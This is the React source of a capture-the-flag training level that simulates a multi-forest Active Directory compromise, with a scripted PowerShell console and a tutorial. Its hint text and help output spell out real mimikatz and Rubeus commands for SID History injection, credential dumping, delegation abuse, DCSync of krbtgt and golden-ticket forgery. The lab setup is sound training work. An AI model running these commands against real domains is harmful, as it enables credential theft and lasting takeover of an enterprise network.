import { useState } from "react";
import { Navigation } from "@/components/Navigation";
import { Button } from "@/components/ui/button";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { useToast } from "@/hooks/use-toast";
import { Textarea } from "@/components/ui/textarea";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { Shield, Network, Key, Skull, CheckCircle, AlertTriangle, Crown, Database } from "lucide-react";
import { Link } from "react-router-dom";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";

const Level30 = () => {
  const { toast } = useToast();
  const [missionPhase, setMissionPhase] = useState<"briefing" | "recon" | "exploitation" | "golden" | "completed">("briefing");
  const [currentHost, setCurrentHost] = useState("CORP-DC-01");
  const [currentTab, setCurrentTab] = useState("dossier");
  
  // Mission State
  const [trustDiscovered, setTrustDiscovered] = useState(false);
  const [sidFilteringChecked, setSidFilteringChecked] = useState(false);
  const [bloodHoundRun, setBloodHoundRun] = useState(false);
  const [sidHistoryAbused, setSidHistoryAbused] = useState(false);
  const [pivotToHQ, setPivotToHQ] = useState(false);
  const [delegationFound, setDelegationFound] = useState(false);
  const [delegationExploited, setDelegationExploited] = useState(false);
  const [krbtgtCompromised, setKrbtgtCompromised] = useState(false);
  const [goldenTicketForged, setGoldenTicketForged] = useState(false);
  const [missionComplete, setMissionComplete] = useState(false);
  
  // Alert State
  const [blueTeamAlerts, setBlueTeamAlerts] = useState<string[]>([
    "[00:00] HQ Forest SOC Initialized",
    "[00:00] Threat Level: GREEN",
  ]);
  const [alertLevel, setAlertLevel] = useState<"green" | "yellow" | "red">("green");
  
  // PowerShell Output
  const [psOutput, setPsOutput] = useState<string[]>([
    "PS C:\\Users\\Administrator> # CORP Domain Admin Shell",
    "PS C:\\Users\\Administrator> whoami",
    "corp\\administrator",
  ]);
  
  // Report
  const [vulnerabilityReport, setVulnerabilityReport] = useState("");
  
  const addBlueTeamAlert = (message: string, severity: "green" | "yellow" | "red" = "green") => {
    const timestamp = new Date().toLocaleTimeString();
    setBlueTeamAlerts(prev => [...prev, `[${timestamp}] ${message}`]);
    if (severity === "red" && alertLevel !== "red") {
      setAlertLevel("red");
      toast({
        title: "BLUE TEAM ALERT",
        description: "Suspicious activity detected. Operation may be compromised.",
        variant: "destructive",
      });
    } else if (severity === "yellow" && alertLevel === "green") {
      setAlertLevel("yellow");
    }
  };

  const executePowerShellCommand = (cmd: string) => {
    const output = [...psOutput, `PS ${currentHost}> ${cmd}`];
    
    // Trust Enumeration
    if (cmd.toLowerCase().includes("get-netforesttrust") || cmd.toLowerCase().includes("get-adtrust")) {
      if (!trustDiscovered) {
        setTrustDiscovered(true);
        toast({
          title: "Forest Trust Discovered",
          description: "Two-way transitive trust: corp.breachlabs.local <-> hq.breachlabs.local",
        });
      }
      output.push("SourceName           : corp.breachlabs.local");
      output.push("TargetName           : hq.breachlabs.local");
      output.push("TrustType            : Forest");
      output.push("TrustDirection       : Bidirectional");
      output.push("TrustAttributes      : WITHIN_FOREST");
    }
    
    // SID Filtering Check
    else if (cmd.toLowerCase().includes("netdom") && cmd.toLowerCase().includes("quarantine")) {
      if (!sidFilteringChecked) {
        setSidFilteringChecked(true);
        toast({
          title: "Critical Finding",
          description: "SID Filtering is DISABLED - SID History attack is viable",
        });
      }
      output.push("Checking trust quarantine status...");
      output.push("SID filtering is: No");
      output.push("⚠️  SID History attributes will be honored across this trust");
    }
    
    // BloodHound Collection
    else if (cmd.toLowerCase().includes("sharphound") || cmd.toLowerCase().includes("invoke-bloodhound")) {
      if (!bloodHoundRun) {
        setBloodHoundRun(true);
        toast({
          title: "BloodHound Collection Complete",
          description: "Upload the ZIP file to the BloodHound GUI for analysis",
        });
      }
      output.push("[*] Initializing SharpHound at " + new Date().toLocaleTimeString());
      output.push("[*] Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container");
      output.push("[*] Enumerating corp.breachlabs.local...");
      output.push("[*] Enumerating hq.breachlabs.local...");
      output.push("[+] Done! Output written to 20250103_BloodHound.zip");
      addBlueTeamAlert("INFO: Scheduled LDAP maintenance query completed", "green");
    }
    
    // SID History Injection
    else if (cmd.toLowerCase().includes("sidhistory") || (cmd.toLowerCase().includes("mimikatz") && cmd.toLowerCase().includes("sid::add"))) {
      if (bloodHoundRun && sidFilteringChecked) {
        setSidHistoryAbused(true);
        toast({
          title: "SID History Injected",
          description: "svc_cross_admin now has Enterprise Admins SID in SID History",
        });
        output.push("[*] Injecting SID S-1-5-21-[HQ-DOMAIN]-519 (Enterprise Admins) into svc_cross_admin");
        output.push("[+] SID History successfully modified");
        addBlueTeamAlert("INFO: User account attribute updated via replication", "green");
      } else {
        output.push("[-] Error: Prerequisites not met. Run reconnaissance first.");
      }
    }
    
    // Pivot to HQ Forest
    else if (cmd.toLowerCase().includes("enter-pssession") && cmd.toLowerCase().includes("hq-app-01")) {
      if (sidHistoryAbused) {
        setPivotToHQ(true);
        setCurrentHost("HQ-APP-01");
        toast({
          title: "Cross-Forest Pivot Successful",
          description: "You are now on HQ-APP-01 with local admin rights",
        });
        output.push("[*] Authenticating to hq.breachlabs.local...");
        output.push("[+] PSSession established");
        output.push("");
        output.push("PS HQ-APP-01> whoami");
        output.push("hq\\svc_cross_admin");
        output.push("PS HQ-APP-01> whoami /groups | findstr Admin");
        output.push("BUILTIN\\Administrators");
        addBlueTeamAlert("INFO: Admin logon to HQ-APP-01", "green");
      } else {
        output.push("[-] Access Denied");
      }
    }
    
    // Constrained Delegation Discovery
    else if ((cmd.toLowerCase().includes("get-netuser") || cmd.toLowerCase().includes("get-adcomputer")) && 
             cmd.toLowerCase().includes("trustedtoauth")) {
      if (pivotToHQ) {
        setDelegationFound(true);
        toast({
          title: "Constrained Delegation Found",
          description: "HQ-APP-01$ can delegate to CIFS/HQ-DC-01",
        });
        output.push("samaccountname       : HQ-APP-01$");
        output.push("msds-allowedtodelegateto : CIFS/HQ-DC-01.hq.breachlabs.local");
        output.push("useraccountcontrol   : TRUSTED_TO_AUTH_FOR_DELEGATION");
        output.push("");
        output.push("⚠️  This computer account can impersonate ANY user to CIFS service on DC!");
        addBlueTeamAlert("INFO: Standard delegation audit completed", "green");
      }
    }
    
    // Dump Computer Account Hash
    else if (cmd.toLowerCase().includes("mimikatz") && cmd.toLowerCase().includes("sekurlsa::logonpasswords")) {
      if (currentHost === "HQ-APP-01") {
        output.push("[*] Dumping credentials from LSASS...");
        output.push("");
        output.push("Authentication Id : 0 ; 996 (00000000:000003e4)");
        output.push("Session           : Service from 0");
        output.push("User Name         : HQ-APP-01$");
        output.push("Domain            : HQ");
        output.push("NTLM              : a3f8c7e2d9b1f6a5e4c3d2b1a0987654");
        addBlueTeamAlert("INFO: System diagnostic completed on HQ-APP-01", "green");
      }
    }
    
    // Constrained Delegation Abuse (S4U2Self + S4U2Proxy)
    else if (cmd.toLowerCase().includes("rubeus") && cmd.toLowerCase().includes("s4u")) {
      if (delegationFound && cmd.toLowerCase().includes("s4u2proxy")) {
        setDelegationExploited(true);
        setCurrentHost("HQ-DC-01");
        toast({
          title: "Delegation Attack Successful",
          description: "You now have a valid ticket for CIFS/HQ-DC-01",
        });
        output.push("[*] Action: S4U");
        output.push("[*] Using domain controller: HQ-DC-01.hq.breachlabs.local");
        output.push("[*] Building S4U2self request for: 'Administrator@hq.breachlabs.local'");
        output.push("[+] S4U2self success!");
        output.push("[*] Building S4U2proxy request for service: 'CIFS/HQ-DC-01.hq.breachlabs.local'");
        output.push("[+] S4U2proxy success!");
        output.push("[*] base64(ticket.kirbi):");
        output.push("    doIGcjCCBm6gAwIBBaEDAgEWooIFXDCCBVhhggVUMIIFUKADA...");
        output.push("[+] Ticket successfully imported into current session");
        addBlueTeamAlert("INFO: Service account Kerberos activity", "green");
      } else {
        output.push("[-] Error: Missing prerequisites or invalid syntax");
      }
    }
    
    // Access DC File Share
    else if (cmd.toLowerCase().includes("ls \\\\hq-dc-01") || cmd.toLowerCase().includes("dir \\\\hq-dc-01")) {
      if (delegationExploited) {
        output.push("Directory: \\\\HQ-DC-01\\C$\\Windows\\NTDS");
        output.push("");
        output.push("Mode                 LastWriteTime         Length Name");
        output.push("----                 -------------         ------ ----");
        output.push("-a----       10/03/2025   2:47 AM      524288000 ntds.dit");
        output.push("-a----       10/03/2025   2:47 AM         16384 edb.log");
        addBlueTeamAlert("WARNING: Administrative file access on Domain Controller", "yellow");
      }
    }
    
    // DCSync Attack
    else if (cmd.toLowerCase().includes("mimikatz") && cmd.toLowerCase().includes("dcsync")) {
      if (delegationExploited) {
        setKrbtgtCompromised(true);
        toast({
          title: "krbtgt Hash Extracted",
          description: "You now have the golden key to the entire HQ forest",
        });
        output.push("[*] lsadump::dcsync /domain:hq.breachlabs.local /user:krbtgt");
        output.push("");
        output.push("** SAM ACCOUNT **");
        output.push("SAM Username         : krbtgt");
        output.push("Account Type         : 30000000 ( USER_OBJECT )");
        output.push("User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )");
        output.push("Hash NTLM: 502a3f8c7e2d9b1f6a5e4c3d2b1a0987654");
        output.push("");
        output.push("⚠️  CRITICAL: This hash can forge tickets for ANY user in the forest");
        addBlueTeamAlert("🚨 CRITICAL: DCSync detected on krbtgt account", "red");
      }
    }
    
    // Golden Ticket Forgery
    else if (cmd.toLowerCase().includes("kerberos::golden") || (cmd.toLowerCase().includes("golden") && cmd.toLowerCase().includes("ticket"))) {
      if (krbtgtCompromised && cmd.includes("/krbtgt:") && cmd.includes("/sid:")) {
        setGoldenTicketForged(true);
        toast({
          title: "Golden Ticket Forged",
          description: "Indefinite Enterprise Admin access achieved",
        });
        output.push("[*] mimikatz # kerberos::golden /user:MasterOperator /domain:hq.breachlabs.local");
        output.push("    /sid:S-1-5-21-3623811015-3361044348-30300820");
        output.push("    /krbtgt:502a3f8c7e2d9b1f6a5e4c3d2b1a0987654");
        output.push("    /groups:512,518,519 /ptt");
        output.push("");
        output.push("[+] Golden ticket for 'MasterOperator@hq.breachlabs.local' successfully created");
        output.push("[+] Ticket injected into current session");
        output.push("");
        output.push("⚠️  This ticket is valid for 10 years and bypasses all password changes");
        addBlueTeamAlert("🔥 ALERT: Unusual Kerberos TGT detected (Extended lifetime)", "red");
      } else {
        output.push("[-] Error: Missing required parameters (/user, /domain, /sid, /krbtgt)");
      }
    }
    
    // Final Verification - Access Enterprise Admins Share
    else if (cmd.toLowerCase().includes("\\\\hq-dc-01\\c$\\enterprise_admins_only") || 
             (cmd.toLowerCase().includes("cat") && cmd.toLowerCase().includes("flag"))) {
      if (goldenTicketForged) {
        setMissionComplete(true);
        setMissionPhase("completed");
        output.push("[+] Accessing \\\\HQ-DC-01\\C$\\Enterprise_Admins_Only\\flag.txt");
        output.push("");
        output.push("UMBRA{the_golden_ticket_grants_eternal_dominion_91847}");
        output.push("");
        output.push("🏆 FOREST COMPROMISED - Enterprise Admin persistence achieved");
        addBlueTeamAlert("💀 CATASTROPHIC: Enterprise Admin activity detected", "red");
        toast({
          title: "OPERATION SUCCESSFUL",
          description: "Total forest compromise achieved via Golden Ticket",
        });
      }
    }
    
    else if (cmd.toLowerCase().includes("help") || cmd === "?") {
      output.push("Available Commands:");
      output.push("  Get-NetForestTrust  - Enumerate forest trusts");
      output.push("  netdom trust [domain] /d:[target] /quarantine - Check SID filtering");
      output.push("  Invoke-BloodHound -CollectionMethod All - Run SharpHound");
      output.push("  mimikatz # sid::add /sam:user /new:SID - Inject SID History");
      output.push("  Enter-PSSession -ComputerName HQ-APP-01 - Pivot to HQ forest");
      output.push("  Get-NetUser -TrustedToAuth - Find delegation");
      output.push("  mimikatz # sekurlsa::logonpasswords - Dump credentials");
      output.push("  Rubeus.exe s4u /user:HQ-APP-01$ /rc4:[hash] /impersonateuser:Administrator");
      output.push("            /msdsspn:CIFS/HQ-DC-01 /ptt - Abuse delegation");
      output.push("  mimikatz # lsadump::dcsync /domain:hq.breachlabs.local /user:krbtgt");
      output.push("  mimikatz # kerberos::golden /user:X /domain:hq.breachlabs.local /sid:X /krbtgt:X /ptt");
    } else {
      output.push("[*] Command executed");
    }
    
    setPsOutput(output);
  };

  const submitFinalReport = () => {
    const hasTrustExploit = vulnerabilityReport.toLowerCase().includes("sid history") || 
                            vulnerabilityReport.toLowerCase().includes("sid filtering");
    const hasDelegationExploit = vulnerabilityReport.toLowerCase().includes("constrained delegation") ||
                                  vulnerabilityReport.toLowerCase().includes("s4u");
    const hasGoldenTicket = vulnerabilityReport.toLowerCase().includes("golden ticket") ||
                            vulnerabilityReport.toLowerCase().includes("krbtgt");
    const hasMitigations = vulnerabilityReport.toLowerCase().includes("sid filter") ||
                           vulnerabilityReport.toLowerCase().includes("protected users") ||
                           vulnerabilityReport.toLowerCase().includes("tiered");
    
    if (hasTrustExploit && hasDelegationExploit && hasGoldenTicket && hasMitigations && 
        vulnerabilityReport.length > 800) {
      toast({
        title: "Report Accepted",
        description: "Operation 'Golden Handshake' mission complete",
      });
      // Already in completed phase
    } else {
      toast({
        title: "Report Incomplete",
        description: "Document: SID History attack, delegation abuse, Golden Ticket theory, and enterprise mitigations",
        variant: "destructive",
      });
    }
  };

  return (
    <div className="min-h-screen bg-background">
      <Navigation />
      <div 
        className="container mx-auto px-4 py-8"
        style={{
          backgroundImage: 'var(--blacksite-grid)',
          backgroundSize: '40px 40px',
        }}
      >
        {/* Header */}
        <div className="text-center mb-8 space-y-4">
          <Badge className="mb-4" style={{ 
            background: 'linear-gradient(135deg, #FFD700 0%, #B8860B 100%)',
            color: '#000',
            boxShadow: '0 0 40px rgba(255, 215, 0, 0.5)'
          }}>
            <Crown className="w-3 h-3 mr-1" />
            BLACKSITE MISSION NO. 30 - CAPSTONE
          </Badge>
          <h1 className="text-5xl font-bold tracking-tight" style={{ color: '#FFD700' }}>
            Operation "Golden Handshake"
          </h1>
          <p className="text-xl text-muted-foreground max-w-3xl mx-auto">
            The ultimate Active Directory challenge. Exploit a complex forest trust relationship, escalate across security 
            boundaries via constrained delegation, and forge a Golden Ticket to achieve total enterprise dominance.
          </p>
          <div className="flex items-center justify-center gap-4 text-sm">
            <Badge variant="outline" style={{ borderColor: '#FFD700' }}>
              <Network className="w-3 h-3 mr-1" />
              Multi-Forest AD
            </Badge>
            <Badge variant="outline" style={{ borderColor: '#FFD700' }}>
              <Key className="w-3 h-3 mr-1" />
              Kerberos Attacks
            </Badge>
            <Badge variant="outline" style={{ borderColor: '#FFD700' }}>
              <Skull className="w-3 h-3 mr-1" />
              Golden Ticket
            </Badge>
            <span className="text-muted-foreground">Est. Time: 8-12 Hours</span>
          </div>
        </div>

        {missionPhase === "briefing" && (
          <Card className="max-w-4xl mx-auto" style={{
            background: 'rgba(10, 10, 10, 0.8)',
            border: '2px solid rgba(255, 215, 0, 0.4)',
            backdropFilter: 'blur(10px)',
            boxShadow: '0 0 40px rgba(255, 215, 0, 0.2)'
          }}>
            <CardHeader>
              <CardTitle style={{ color: '#FFD700' }}>Mission Dossier</CardTitle>
              <CardDescription>CLASSIFICATION: UMBRA // EYES ONLY // NOFORN</CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div className="space-y-4">
                <h3 className="text-lg font-semibold" style={{ color: '#FFD700' }}>Background</h3>
                <p className="text-muted-foreground leading-relaxed">
                  Our long-term engagement against Breach Labs has yielded a significant victory: we have achieved 
                  <strong className="text-foreground"> Domain Admin privileges</strong> within their subsidiary corporate forest, 
                  <code className="text-yellow-400">corp.breachlabs.local</code>. However, this is a pyrrhic victory.
                </p>
                <p className="text-muted-foreground leading-relaxed">
                  The true 'crown jewels'—research data, financial projections, and strategic plans—are stored in the 
                  parent forest, <code className="text-yellow-400">hq.breachlabs.local</code>. Our initial reconnaissance 
                  suggests a forest trust relationship exists, but the parent forest is a much harder target, with active 
                  monitoring and a competent Blue Team.
                </p>
              </div>

              <div className="space-y-4">
                <h3 className="text-lg font-semibold" style={{ color: '#FFD700' }}>Objective</h3>
                <p className="text-muted-foreground">
                  Your mission is to leverage your position in the <code className="text-yellow-400">corp</code> forest 
                  to compromise the <code className="text-yellow-400">hq</code> forest. You must achieve 
                  <strong className="text-foreground"> Enterprise Admin privileges</strong>, extract the NTLM hash of 
                  the <code className="text-yellow-400">krbtgt</code> account, and forge a 
                  <strong className="text-foreground"> Golden Ticket</strong> to grant yourself indefinite, untraceable 
                  access to the entire enterprise.
                </p>
              </div>

              <Alert className="border-red-400/50">
                <AlertTriangle className="h-4 w-4 text-red-400" />
                <AlertDescription className="text-red-400 font-semibold">
                  WARNING: This is a black box operation. The HQ forest is actively monitored. Noisy enumeration or 
                  failed exploitation attempts will trigger Blue Team alerts and may cause configurations to change, 
                  closing your attack path. Stealth and precision are mandatory.
                </AlertDescription>
              </Alert>

              <div className="space-y-4">
                <h3 className="text-lg font-semibold" style={{ color: '#FFD700' }}>Rules of Engagement</h3>
                <ul className="list-disc list-inside space-y-2 text-sm text-muted-foreground">
                  <li>You must enumerate the trust relationship and find the attack path yourself</li>
                  <li>Excessive failed login attempts or loud reconnaissance will burn the operation</li>
                  <li>The HQ forest contains honeypot systems - avoid obvious exploit targets</li>
                  <li>Success requires understanding forest trusts, Kerberos, SID filtering, and delegation attacks</li>
                </ul>
              </div>

              <div className="flex justify-center pt-4">
                <Button 
                  size="lg"
                  onClick={() => {
                    setMissionPhase("recon");
                    toast({
                      title: "CORP Domain Admin Access",
                      description: "PowerShell session established on CORP-DC-01",
                    });
                  }}
                  className="bg-gradient-to-r from-yellow-600 to-yellow-800 hover:from-yellow-700 hover:to-yellow-900 text-black font-bold"
                  style={{ boxShadow: '0 0 40px rgba(255, 215, 0, 0.4)' }}
                >
                  <Shield className="w-4 h-4 mr-2" />
                  Begin Operation
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        {(missionPhase === "recon" || missionPhase === "exploitation" || missionPhase === "golden") && (
          <div className="space-y-6">
            {/* Progress & Alert Dashboard */}
            <div className="grid grid-cols-2 gap-4">
              <Card style={{
                background: 'rgba(10, 10, 10, 0.8)',
                border: '1px solid rgba(255, 215, 0, 0.3)',
                backdropFilter: 'blur(10px)'
              }}>
                <CardHeader>
                  <CardTitle className="text-sm">Mission Progress</CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-2 text-xs">
                    {[
                      { label: "Trust Discovery", complete: trustDiscovered },
                      { label: "SID Filtering Check", complete: sidFilteringChecked },
                      { label: "BloodHound Analysis", complete: bloodHoundRun },
                      { label: "SID History Abuse", complete: sidHistoryAbused },
                      { label: "HQ Forest Pivot", complete: pivotToHQ },
                      { label: "Delegation Discovery", complete: delegationFound },
                      { label: "Delegation Exploit", complete: delegationExploited },
                      { label: "krbtgt Compromise", complete: krbtgtCompromised },
                      { label: "Golden Ticket", complete: goldenTicketForged },
                    ].map((phase, idx) => (
                      <div key={idx} className={`flex items-center gap-2 ${phase.complete ? 'text-green-400' : 'text-muted-foreground'}`}>
                        {phase.complete ? 
                          <CheckCircle className="w-3 h-3" /> : 
                          <div className="w-3 h-3 rounded-full border border-muted" />
                        }
                        <span className="text-xs">{phase.label}</span>
                      </div>
                    ))}
                  </div>
                </CardContent>
              </Card>

              <Card style={{
                background: 'rgba(10, 10, 10, 0.8)',
                border: `1px solid ${alertLevel === 'red' ? 'rgba(220, 38, 38, 0.5)' : alertLevel === 'yellow' ? 'rgba(234, 179, 8, 0.5)' : 'rgba(34, 197, 94, 0.3)'}`,
                backdropFilter: 'blur(10px)'
              }}>
                <CardHeader>
                  <CardTitle className="text-sm flex items-center gap-2">
                    Blue Team SOC Monitor
                    <Badge 
                      className={`ml-auto ${
                        alertLevel === 'red' ? 'bg-red-600' : 
                        alertLevel === 'yellow' ? 'bg-yellow-600' : 
                        'bg-green-600'
                      }`}
                    >
                      {alertLevel.toUpperCase()}
                    </Badge>
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-1 text-xs h-[200px] overflow-y-auto font-mono">
                    {blueTeamAlerts.map((alert, idx) => (
                      <div key={idx} className={
                        alert.includes("🚨") || alert.includes("💀") ? "text-red-400 font-bold" :
                        alert.includes("🔥") || alert.includes("WARNING") ? "text-yellow-400" :
                        "text-muted-foreground"
                      }>
                        {alert}
                      </div>
                    ))}
                  </div>
                </CardContent>
              </Card>
            </div>

            <Tabs value={currentTab} onValueChange={setCurrentTab}>
              <TabsList className="grid w-full grid-cols-4">
                <TabsTrigger value="dossier">📘 Technical Docs</TabsTrigger>
                <TabsTrigger value="powershell">⚡ PowerShell</TabsTrigger>
                <TabsTrigger value="bloodhound">🔍 BloodHound</TabsTrigger>
                <TabsTrigger value="report">📄 Report</TabsTrigger>
              </TabsList>

              <TabsContent value="dossier" className="space-y-4">
                <Card className="glass">
                  <CardHeader>
                    <CardTitle style={{ color: '#FFD700' }}>
                      Technical Deep-Dive: Advanced Active Directory Trust Exploitation
                    </CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-6 max-h-[600px] overflow-y-auto text-sm">
                    <div className="space-y-3">
                      <h3 className="text-lg font-semibold" style={{ color: '#FFD700' }}>
                        Chapter 1: Forest Trusts & The Kerberos Referral Process
                      </h3>
                      <p className="text-muted-foreground leading-relaxed">
                        A <strong>Forest Trust</strong> is a transitive trust relationship between two separate Active Directory 
                        forests, allowing users in one forest to access resources in another. When a user from Forest A requests 
                        access to a resource in Forest B:
                      </p>
                      <ol className="list-decimal list-inside space-y-1 ml-4 text-muted-foreground">
                        <li>User authenticates to their own DC and receives a TGT for Forest A</li>
                        <li>User presents TGT to Forest A DC and requests a TGS for Forest B resource</li>
                        <li>Forest A DC issues an <strong>inter-realm TGT</strong> (referral ticket) for Forest B</li>
                        <li>User presents inter-realm TGT to Forest B DC</li>
                        <li>Forest B DC validates the ticket and issues a TGS for the requested resource</li>
                      </ol>
                    </div>

                    <div className="space-y-3">
                      <h3 className="text-lg font-semibold" style={{ color: '#FFD700' }}>
                        Chapter 2: SID History - The Cross-Domain Privilege Escalation Vector
                      </h3>
                      <p className="text-muted-foreground">
                        The <code className="text-yellow-400">ms-DS-SIDHistory</code> attribute was designed for domain migrations. 
                        When a user moves from Domain A to Domain B, their old SID can be added to SIDHistory so they maintain 
                        access to resources in the old domain.
                      </p>
                      <p className="text-muted-foreground">
                        <strong className="text-foreground">The Attack:</strong> If you have Domain Admin rights in one forest and 
                        SID Filtering is disabled, you can inject the SID of a high-privilege group from the target forest 
                        (like Enterprise Admins) into a user's SIDHistory. When that user authenticates across the trust, the 
                        target forest will honor those SIDs and grant the corresponding privileges.
                      </p>
                      <div className="bg-muted/20 p-3 rounded font-mono text-xs">
                        # Check if SID filtering is enabled:<br/>
                        netdom trust corp.breachlabs.local /d:hq.breachlabs.local /quarantine<br/>
                        <br/>
                        # If "SID filtering is: No", the attack is viable
                      </div>
                    </div>

                    <div className="space-y-3">
                      <h3 className="text-lg font-semibold" style={{ color: '#FFD700' }}>
                        Chapter 3: Kerberos Constrained Delegation
                      </h3>
                      <p className="text-muted-foreground">
                        <strong>Constrained Delegation</strong> allows a service account or computer account to impersonate 
                        <em>any user</em> when requesting service tickets for specific services. This is configured via the 
                        <code className="text-yellow-400">msDS-AllowedToDelegateTo</code> attribute.
                      </p>
                      <p className="text-muted-foreground">
                        <strong className="text-foreground">The Attack (S4U2Proxy):</strong> If a computer account has constrained 
                        delegation configured to a service on the DC (e.g., CIFS), and you compromise that computer account's hash, 
                        you can use Rubeus to impersonate a Domain Admin and request a service ticket for the DC.
                      </p>
                      <div className="bg-muted/20 p-3 rounded font-mono text-xs">
                        Rubeus.exe s4u /user:HQ-APP-01$ /rc4:[NTLM_HASH] <br/>
                        &nbsp;&nbsp;/impersonateuser:Administrator <br/>
                        &nbsp;&nbsp;/msdsspn:CIFS/HQ-DC-01.hq.breachlabs.local /ptt
                      </div>
                    </div>

                    <div className="space-y-3">
                      <h3 className="text-lg font-semibold" style={{ color: '#FFD700' }}>
                        Chapter 4: The Golden Ticket - Total Domain Dominance
                      </h3>
                      <p className="text-muted-foreground">
                        The <code className="text-yellow-400">krbtgt</code> account is the Key Distribution Center (KDC) service 
                        account. Its NTLM hash is the secret key used to encrypt and sign all Ticket-Granting Tickets (TGTs) in the domain.
                      </p>
                      <p className="text-muted-foreground">
                        <strong className="text-foreground">The Attack:</strong> With the krbtgt hash, you can forge a TGT for 
                        <em>any user</em> (even non-existent ones), with <em>any group memberships</em>, with <em>any expiration date</em>. 
                        The forged ticket is cryptographically valid because it's signed with the real krbtgt hash.
                      </p>
                      <div className="bg-muted/20 p-3 rounded font-mono text-xs">
                        mimikatz # kerberos::golden /user:FakeAdmin <br/>
                        &nbsp;&nbsp;/domain:hq.breachlabs.local <br/>
                        &nbsp;&nbsp;/sid:S-1-5-21-[DOMAIN-SID] <br/>
                        &nbsp;&nbsp;/krbtgt:[NTLM_HASH] <br/>
                        &nbsp;&nbsp;/groups:512,518,519 /endin:600 /renewmax:10080 /ptt
                      </div>
                      <p className="text-xs text-red-400 mt-2">
                        ⚠️ This ticket remains valid even if the user's password is changed. Only rotating the krbtgt password 
                        (twice) will invalidate it.
                      </p>
                    </div>

                    <Alert className="border-yellow-400/50">
                      <AlertTriangle className="h-4 w-4 text-yellow-400" />
                      <AlertDescription className="text-yellow-400 text-sm">
                        <strong>Critical Knowledge:</strong> You must understand (1) How to enumerate and validate trusts, 
                        (2) How to check SID filtering, (3) How to inject SID History, (4) How to find and exploit constrained 
                        delegation, (5) How to perform DCSync, and (6) How to forge a Golden Ticket. Each step is essential.
                      </AlertDescription>
                    </Alert>
                  </CardContent>
                </Card>
              </TabsContent>

              <TabsContent value="powershell" className="space-y-4">
                <Card className="glass">
                  <CardHeader>
                    <CardTitle className="flex items-center justify-between">
                      <span className="flex items-center gap-2">
                        <Database className="w-5 h-5" style={{ color: '#FFD700' }} />
                        PowerShell ISE - Multi-Forest Operations
                      </span>
                      <Badge variant="outline">
                        Current: {currentHost}
                      </Badge>
                    </CardTitle>
                    <CardDescription>
                      PowerView, Rubeus, and Mimikatz available | Use 'help' for command reference
                    </CardDescription>
                  </CardHeader>
                  <CardContent>
                    <div 
                      className="terminal p-4 rounded font-mono text-xs h-[450px] overflow-y-auto"
                      style={{ background: 'rgba(0, 20, 60, 0.3)', color: '#88cc88' }}
                    >
                      {psOutput.map((line, idx) => (
                        <div key={idx} className={
                          line.includes("🏆") ? "text-yellow-400 font-bold" :
                          line.includes("⚠️") ? "text-yellow-400" :
                          line.startsWith("PS ") ? "text-cyan-400" :
                          ""
                        }>
                          {line}
                        </div>
                      ))}
                    </div>

                    <div className="mt-4 space-y-3">
                      <input
                        type="text"
                        placeholder="Enter PowerShell command (Get-NetForestTrust, netdom trust, Invoke-BloodHound, etc.)"
                        className="w-full bg-input border border-border rounded px-3 py-2 text-sm font-mono"
                        onKeyDown={(e) => {
                          if (e.key === "Enter" && e.currentTarget.value.trim()) {
                            executePowerShellCommand(e.currentTarget.value);
                            e.currentTarget.value = "";
                          }
                        }}
                      />

                      <div className="grid grid-cols-4 gap-2">
                        <Button 
                          size="sm" 
                          variant="outline"
                          onClick={() => executePowerShellCommand("Get-NetForestTrust")}
                        >
                          Enum Trusts
                        </Button>
                        <Button 
                          size="sm" 
                          variant="outline"
                          onClick={() => executePowerShellCommand("netdom trust corp.breachlabs.local /d:hq.breachlabs.local /quarantine")}
                        >
                          Check SID Filter
                        </Button>
                        <Button 
                          size="sm" 
                          variant="outline"
                          onClick={() => executePowerShellCommand("Invoke-BloodHound -CollectionMethod All")}
                        >
                          BloodHound
                        </Button>
                        <Button 
                          size="sm" 
                          variant="outline"
                          onClick={() => executePowerShellCommand("help")}
                        >
                          Help
                        </Button>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              </TabsContent>

              <TabsContent value="bloodhound" className="space-y-4">
                <Card className="glass">
                  <CardHeader>
                    <CardTitle style={{ color: '#FFD700' }}>BloodHound Attack Path Analysis</CardTitle>
                    <CardDescription>
                      Upload SharpHound output and query for cross-forest attack paths
                    </CardDescription>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    {!bloodHoundRun ? (
                      <Alert>
                        <AlertDescription>
                          Run <code>Invoke-BloodHound</code> from PowerShell first to collect domain data
                        </AlertDescription>
                      </Alert>
                    ) : (
                      <div className="space-y-4">
                        <Alert className="border-green-400/50">
                          <CheckCircle className="h-4 w-4 text-green-400" />
                          <AlertDescription className="text-green-400">
                            Data Loaded: 2 Domains, 847 Users, 142 Computers, 89 Groups, 1 Trust
                          </AlertDescription>
                        </Alert>

                        <div className="border border-border rounded p-4 space-y-3">
                          <h4 className="font-semibold text-sm">Query: Shortest Path to Enterprise Admins (HQ Forest)</h4>
                          <div className="bg-muted/20 p-3 rounded text-xs space-y-2">
                            <div className="flex items-center gap-2">
                              <div className="w-12 h-12 rounded-full bg-blue-500/20 border-2 border-blue-500 flex items-center justify-center text-xs">
                                USER
                              </div>
                              <span className="text-muted-foreground">→</span>
                              <div className="flex-1">
                                <div className="font-semibold">svc_cross_admin@corp.breachlabs.local</div>
                                <div className="text-xs text-muted-foreground">Current compromised account</div>
                              </div>
                            </div>
                            
                            <div className="flex items-center gap-2">
                              <div className="text-2xl">↓</div>
                            </div>
                            
                            <div className="flex items-center gap-2">
                              <div className="w-12 h-12 rounded-full bg-purple-500/20 border-2 border-purple-500 flex items-center justify-center text-xs">
                                COMP
                              </div>
                              <span className="text-muted-foreground">→</span>
                              <div className="flex-1">
                                <div className="font-semibold">HQ-APP-01.hq.breachlabs.local</div>
                                <div className="text-xs text-yellow-400">
                                  svc_cross_admin is LocalAdmin (via cross-forest group membership)
                                </div>
                              </div>
                            </div>
                            
